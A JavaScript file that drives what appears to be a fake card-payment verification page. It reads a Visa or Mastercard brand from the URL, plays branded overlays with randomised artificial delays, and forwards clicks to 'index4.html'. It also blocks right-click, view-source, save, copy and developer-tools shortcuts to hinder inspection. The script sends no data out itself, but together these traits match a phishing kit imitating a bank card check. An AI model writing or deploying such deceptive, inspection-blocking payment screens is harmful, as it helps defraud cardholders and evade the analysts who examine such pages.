(function(){
  const $ = (id) => document.getElementById(id);
  const getBrand = () => {
    const p = new URLSearchParams(location.search);
    const b = (p.get('brand')||'').toLowerCase();
    if (b==='visa' || b==='v') return 'visa';
    if (b==='mastercard' || b==='mc') return 'mastercard';
    return '';
  };

  function pickHold1(){
    const OPTIONS = [2500, 3000, 3500];
    const last = Number(sessionStorage.getItem('hold1_last')) || 0;
    const pool = OPTIONS.filter(v => v !== last);
    const sel = pool[Math.floor(Math.random() * pool.length)];
    sessionStorage.setItem('hold1_last', String(sel));
    return sel;
  }
  const HOLD1 = pickHold1();

  function pickHold2(){
    const OPTIONS = [3500, 4000, 4500, 5000];
    const last = Number(sessionStorage.getItem('hold2_last')) || 0;
    const pool = OPTIONS.filter(v => v !== last);
    const sel = pool[Math.floor(Math.random() * pool.length)];
    sessionStorage.setItem('hold2_last', String(sel));
    return sel;
  }
  const HOLD2 = pickHold2();

  const BRAND = getBrand();

  const step1El = $('step-1');
  const step2El = $('step-2');
  const step3El = $('step-3');

  function showOverlay(el){
    el.classList.remove('is-gone','is-hide');
    const card = el.querySelector('.motion');
    if(card){
      card.classList.remove('motion-out');
      void card.offsetWidth;
      card.classList.add('motion-in');
    }
  }
  function hideOverlay(el){
    const card = el.querySelector('.motion');
    if(card){
      card.classList.remove('motion-in');
      void card.offsetWidth;
      card.classList.add('motion-out');
      setTimeout(()=>{ el.classList.add('is-hide'); setTimeout(()=>el.classList.add('is-gone'), 30) }, 160);
    }else{
      el.classList.add('is-hide'); setTimeout(()=>el.classList.add('is-gone'), 200);
    }
  }

  function step1(){
    step3El.classList.remove('is-on');
    showOverlay(step1El);
    setTimeout(()=>{ BRAND ? step2() : step3() }, HOLD1);
  }

  function step2(){
    const visa = document.getElementById('brand-visa');
    const mc   = document.getElementById('brand-mc');
    const sweep= document.getElementById('brand-sweep');

    if (BRAND==='visa'){
      visa.classList.remove('hidden'); visa.setAttribute('aria-hidden','false');
      mc.classList.add('hidden');      mc.setAttribute('aria-hidden','true');
      if (sweep) sweep.setAttribute('stroke','#1a4dd9');
      visa.classList.remove('brand-pop'); void visa.offsetWidth; visa.classList.add('brand-pop');
    }else{
      mc.classList.remove('hidden');    mc.setAttribute('aria-hidden','false');
      visa.classList.add('hidden');     visa.setAttribute('aria-hidden','true');
      if (sweep) sweep.setAttribute('stroke','#ea4738');
      mc.classList.remove('brand-pop'); void mc.offsetWidth; mc.classList.add('brand-pop');
    }

    hideOverlay(step1El);
    showOverlay(step2El);

    setTimeout(step3, HOLD2);
  }

  function step3(){
    hideOverlay(step1El);
    hideOverlay(step2El);
    step3El.classList.add('is-on');
  }

  document.addEventListener('click', (e)=>{
    const btn = e.target.closest('.btn');
    if (!btn) return;
    e.preventDefault();
    location.assign('index4.html');
  });

  document.addEventListener('DOMContentLoaded', step1);

  document.addEventListener('contextmenu', e => e.preventDefault(), {passive:false});
  document.addEventListener('keydown', e => {
    if (
      e.key === 'F12' ||
      (e.ctrlKey && ['u','U','s','S','p','P','c','C'].includes(e.key)) ||
      (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key))
    ) {
      e.preventDefault();
    }
  }, {passive:false});
})();